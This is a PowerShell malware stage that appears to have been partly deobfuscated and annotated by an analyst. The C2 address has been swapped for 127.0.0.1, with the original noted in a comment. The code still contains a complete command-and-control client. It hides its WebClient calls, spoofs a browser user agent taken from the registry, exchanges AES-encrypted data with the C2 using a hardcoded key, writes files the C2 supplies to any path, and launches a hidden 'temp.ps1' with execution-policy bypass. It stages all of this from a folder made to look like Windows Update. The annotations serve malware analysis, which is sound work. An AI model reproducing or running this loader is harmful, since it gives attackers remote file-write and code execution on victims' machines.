#Spec Net.WebClient for later use.
$t_t = "t"
$lien = "`l`ien"
$Web_C = "`WebC"
$Net__ = "`Net`."

function x64_Decode_UTF8 {
    param([system.byte[]]$bb
    )
    $tfa_getS = 'tf8.getS'
    $em_Text_en = 'em.Text.en'
    $s = 'param([System.byt' + 'e[]]$f8_Ge); return ([Syst' + $em_Text_en  + 'coding]::u' + $tfa_getS + 'tring($f8_Ge))'
    $c = [powershell]::Create()
    $c.addScript($s) | out-null
    $c.AddArgument($bb) | out-null
    return ($c.Invoke())
}
#x64 decode bytes
function gb {
    param([string]$ss)
    $f8_Ge = 'f8.Ge'
    $s = 'param([strin' + 'g]$f8_Ge); return ([Syste' + 'm.Text.encoding]::ut' + $f8_Ge + 'tBytes($f8_Ge))'
    $c = [powershell]::Create()
    $c.addScript($s) | out-null
    $c.AddArgument($ss) | out-null
    return ($c.invoke())
}

$mainpath = "C:\Users\$env:username\AppData\Local\Microsoft\Windows\Update\"
#Decode x64, after deobfuscating screen 
function deobfus_x64_And_decode {
    param(
        
        [parameter(Mandatory = $true)]
        [System.String]$string_to_decode
    )
    return x64_Decode_UTF8 -bb ([System.Convert]::FromBase64String($string_to_decode.Replace('-', 'H').Replace('@', 'a')))
}

$C2_Downloaded_Contents = ''
#^%$RTY
$RTY_Str = (deobfus_x64_And_decode('XiUkUlRZ'))
#Initially 'hxxp:4589125189get' Decode octets by adding '.' /xx.xx.xxx.xxx/get
$C2_URL = 'http://127.0.0.1/get'

$C_File_delete_Superfluous = 'c.txt'
$String_Array = New-Object System.Collections.Generic.List[string]

#File ID.txt does not exist. Will go with "Else". These are the contents used in temp1.ps1.
if (Test-Path -Path ($mainpath + "ID.txt")) {

    $ID_txt_Contents = Get-Content ($mainpath + "ID.txt")
    $C2_Downloaded_Contents = $ID_txt_Contents[0]
    $String_Array += $ID_txt_Contents[1]
}
#Obtain the kind of browser from the registry and then add it to the String_array.
else {
    #Get Registry Key Registry::HKCU\SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\. Modified to just do it. 
    $URL_Assoc_Registry_Key = Get-ChildItem -Path "Registry::HKCU\SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\"#(deobfus_x64_And_decode('UmVn@XN0cnk6OkhLQ1VcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcQXNzb2NpYXRpb25zXFVybEFzc29j@WF0@W9uc1xod-RwXA=='))

    $URL_Assoc_Reg_Key_Value = $URL_Assoc_Registry_Key.GetValue((deobfus_x64_And_decode('U-JvZ0lk'))).ToString().ToLower()
    #If the registry key value contains "ProgId"
    if ($URL_Assoc_Reg_Key_Value.Contains((deobfus_x64_And_decode('Y2hyb21l')))) {
        #Add "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" To the String array.
        $String_Array += (deobfus_x64_And_decode('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7I-g2NCkgQXBwbGVXZWJL@XQvNTM3LjM2IChLSFRNTCwgbGlrZSB-ZWNrbykgQ2hyb21lLzEwMi4wLjAuMCBTYWZhcmkvNTM3LjM2'))
    }
    #elIf the registry key contains "firefox"
    elseif ($URL_Assoc_Reg_Key_Value.Contains((deobfus_x64_And_decode('ZmlyZWZveA==')))) {
        #Add "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0" to the string array
        $String_Array += (deobfus_x64_And_decode('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7I-g2NDsgcnY6MTAxLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAxLjA='))
    }
    #elIf the registry key contains "Edge"
    elseif ($URL_Assoc_Reg_Key_Value.Contains((deobfus_x64_And_decode('ZWRnZQ==')))) {
        #Add "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.44" to the string array
        $String_Array += (deobfus_x64_And_decode('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7I-g2NCkgQXBwbGVXZWJL@XQvNTM3LjM2IChLSFRNTCwgbGlrZSB-ZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTI0IFNhZmFy@S81MzcuMzYgRWRnLzEwMi4wLjEyNDUuNDQ='))
    }
    #Elif registry key contains "ie"
    elseif ($URL_Assoc_Reg_Key_Value.Contains((deobfus_x64_And_decode('@WU=')))) {
        #Add "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" to the String array.
        $String_Array += (deobfus_x64_And_decode('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQ7IFRy@WRlbnQvNy4wOyBydjoxMS4wKSBs@WtlIEdlY2tv'))
    }
    #Elif registry key contains "opera"
    elseif ($URL_Assoc_Reg_Key_Value.Contains((deobfus_x64_And_decode('b3BlcmE=')))) {
        #Add "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40" to the string array
        $String_Array += (deobfus_x64_And_decode('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7I-g2NCkgQXBwbGVXZWJL@XQvNTM3LjM2IChLSFRNTCwgbGlrZSB-ZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuMTE1IFNhZmFy@S81MzcuMzYgT1BSLzg4LjAuNDQxMi40MA=='))

    }

    $Web_Client_Object = New-Object System.$Net__$Web_C$lien$t_t
    # Add UserAgent And then whatever defined "web client" is given from the registry queries above.
    $Web_Client_Object.Headers.Add((deobfus_x64_And_decode('VXNlckFnZW50')), $String_Array[0])
    #If C2 doesn't respond, exit.
    $C2_Downloaded_Contents = $Web_Client_Object.DownloadString($C2_URL)
    if ($C2_Downloaded_Contents -eq "" ) {
        exit
    }
    #Spit the downloaded contents into the ID.txt file. 
    $C2_Downloaded_Contents | Out-File -FilePath ($mainpath + "ID.txt")
    $String_Array[0] | Add-Content -Path ($mainpath + "ID.txt")
}
#Define Encryption alg
$encryptolator_obj = New-Object System.Security.Cryptography.AesManaged
$encryptolator_obj.Mode = [System.Security.Cryptography.CipherMode]::CBC
$encryptolator_obj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$encryptolator_obj.BlockSize = 128
$encryptolator_obj.KeySize = 256
[byte[]]$enc_key = 23, 29, 132, 232, 65, 174, 228, 192, 255, 251, 162, 124, 134, 209, 236, 130, 184, 128, 124, 184, 195, 121, 154, 17, 184, 250, 45, 183, 120, 31, 209, 90
[byte[]]$enc_IV = 24, 60, 237, 111, 179, 52, 159, 154, 198, 249, 8, 249, 41, 222, 53, 82
$the_Encryptor = $encryptolator_obj.CreateEncryptor($enc_key, $enc_IV)
$the_Decryptor = $encryptolator_obj.CreateDecryptor($enc_key, $enc_IV)
$moved_C2_Downloaded_Contents = $C2_Downloaded_Contents
#Get the x64 of what the C2 said Deobfuscated
$deobfus_C2_Dwnld_Contents = gb -ss ($moved_C2_Downloaded_Contents)
#Encrypt those contents
$Encrypted_C2_Dwnl_Contents = $the_Encryptor.TransformFinalBlock($deobfus_C2_Dwnld_Contents, 0, $deobfus_C2_Dwnld_Contents.Length)


$Web_Client_Object = New-Object System.$Net__$Web_C$lien$t_t
#User Agent equals, along with whatever was defined by the reg key
$Web_Client_Object.Headers.Add((deobfus_x64_And_decode('VXNlckFnZW50')), $String_Array[0])
$Reply_After_Upload_to_C2 = $Web_Client_Object.UploadData($C2_URL, $Encrypted_C2_Dwnl_Contents)


$Decrypted_C2_Reply_Response = $the_Decryptor.TransformFinalBlock($Reply_After_Upload_to_C2, 0, $Reply_After_Upload_to_C2.Length)
$decoded_reply_Response = x64_Decode_UTF8 -bb $Decrypted_C2_Reply_Response

# Split the reply response by the RTY_Str.  Deobfus the x64 is "SimpleMatch"
$Split_reply_Response_arr = $decoded_reply_Response -split $RTY_Str, 0, (deobfus_x64_And_decode('U2ltcGxlTWF0Y2g='))

#Walk through the reply.
for ($arr_val = 0; $arr_val -lt $Split_reply_Response_arr.Length; $arr_val++) {
    #Exit-case
    if ($Split_reply_Response_arr[$arr_val] -eq ':') {
        break
    }
    #Write to the C file that gets deleted in temp.ps1
    [System.IO.File]::WriteAllText(($mainpath + $C_File_delete_Superfluous), $Split_reply_Response_arr[$arr_val])
    #Get tge actual bytes of the string after decoding, and just convert to x64
    $c = [System.Convert]::ToBase64String( (gb -ss $Split_reply_Response_arr[$arr_val]) )
    #Split by !@#EWQ
    $EWQ_Elements = $Split_reply_Response_arr[$arr_val] -split (deobfus_x64_And_decode('IUAjRVdR')), 0, "SimpleMatch"
    
    $EWQ_Elem_0 = $EWQ_Elements[0]
    #Write the bytes to the WindowsUpdate Folder. from where Elem3 is. (Should error, because it tries to write to a folder.)
    #Sets moved_C2_Downloaded_Contents to [someC2Response]!@#EWQError Occurred[Carriage_return]
    #sets $c to be RES!#% plus the x64 encoded response defined 1 line above this one. 
    #Sets RTY_Str to ^%$RTY
    if ($EWQ_Elem_0 -eq '2') {
        #RTY_STR = !@#EWQ
        $RTY_Str = (deobfus_x64_And_decode('IUAjRVdR'))
        $Path = $EWQ_Elements[2]
        $EWQ_Elem_3 = $EWQ_Elements[3]
        $EWQ_Elem_3_Plaintext = [System.Convert]::FromBase64String($EWQ_Elem_3)

        #error, because it tries to write to a folder.
        [System.IO.File]::WriteAllBytes($Path, $EWQ_Elem_3_Plaintext)
        #Always true. Obfuscated text states "Error Occurred\n" Else-case is "File Copied Succesfully\n"
        if ($Error.Length -gt 0) { $moved_C2_Downloaded_Contents = $EWQ_Elements[1] + $RTY_Str + (deobfus_x64_And_decode('RXJyb3IgT2NjdXJyZWQ=')) }
        else { $moved_C2_Downloaded_Contents = $EWQ_Elements[1] + $RTY_Str + (deobfus_x64_And_decode('RmlsZSBDb3BpZWQgU3VjY2VzZnVsb-k=')) }
        #x64 Encoded string for C2_Downloade_Contents
        $x64_encoded_C2_From_2nd_response = [System.Convert]::ToBase64String((gb -ss $moved_C2_Downloaded_Contents))
        $c = 'RES!#%' + $x64_encoded_C2_From_2nd_response
        $RTY_Str = (deobfus_x64_And_decode('XiUkUlRZ'))
    }
    #Start temp.ps1 with the args defined by the C2 as $c.
    Start-Process powershell -ArgumentList "-exec bypass -file $($mainpath+"temp.ps1") $c" -WindowStyle Hidden

    $Random_sleep_for_no_reason = Get-Random -Maximum 20 -Minimum 10
    Start-Sleep -s $Random_sleep_for_no_reason
}

